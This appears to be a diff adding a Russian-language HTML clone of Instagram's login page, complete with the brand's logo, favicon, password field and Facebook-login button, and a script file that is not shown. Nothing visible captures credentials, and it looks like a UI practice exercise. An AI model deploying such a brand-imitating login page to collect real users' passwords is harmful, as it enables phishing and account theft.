@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1000px-Instagram_logo_2022.svg.png" type="image/x-icon">
+
+    <link href="https://cdn.jsdelivr.net/npm/daisyui@4.12.10/dist/full.min.css" rel="stylesheet" type="text/css" />
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+    
+<body>
+    <div class="h-screen bg-gray-50 flex flex-col justify-center items-center">
+        <div class="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
+            <h1 class="bg-no-repeat instagram-logo w-[150px]"><img
+                    src="./images/png-clipart-instagram-instagram-removebg-preview.png" alt=""></h1>
+            <form class="mt-8 w-64 flex flex-col">
+                <input autofocus
+                    class="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
+                    id="email" placeholder="Телефон, имя пользователя или эл.адрес" type="text">
+                <input autofocus
+                    class="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
+                    id="email" placeholder="Пароль" type="password">
+                <button id="btn" class="text-sm text-center bg-blue-500 text-white py-1 rounded font-medium">
+
+                    <a href="https://www.instagram.com/">Войти</a>
+
+                </button>
+            </form>
+            <div class="flex justify-evenly space-x-2 w-64 mt-4">
+                <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
+                <span class="flex-none uppercase text-xs text-gray-400 font-semibold">или</span>
+                <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
+            </div>
+            <button class="mt-4 flex">
+                <div class="bg-no-repeat facebook-logo mr-1"></div>
+                <span class="text-xs text-blue-900 font-semibold">Войти через Facebook</span>
+            </button>
+            <a class="text-xs text-blue-900 mt-4 cursor-pointer -mb-4">Забыли пароль?</a>
+        </div>
+        <div class="bg-white border border-gray-300 text-center w-80 py-4">
+            <span class="text-sm">У вас ещё нет аккаунта? <span class="text-blue-600">Зарегистрироваться</span></span>
+        </div>
+        <div class="mt-3 text-center">
+            <span class="text-xs">Установите приложение.</span>
+            <div class="flex mt-3 space-x-2">
+                <div class="bg-no-repeat apple-store-logo"></div>
+                <div class="bg-no-repeat google-store-logo"></div>
+            </div>
+        </div>
+    </div>
+
+    <script src="./main.js"></script>
+</body>
+
+</html>
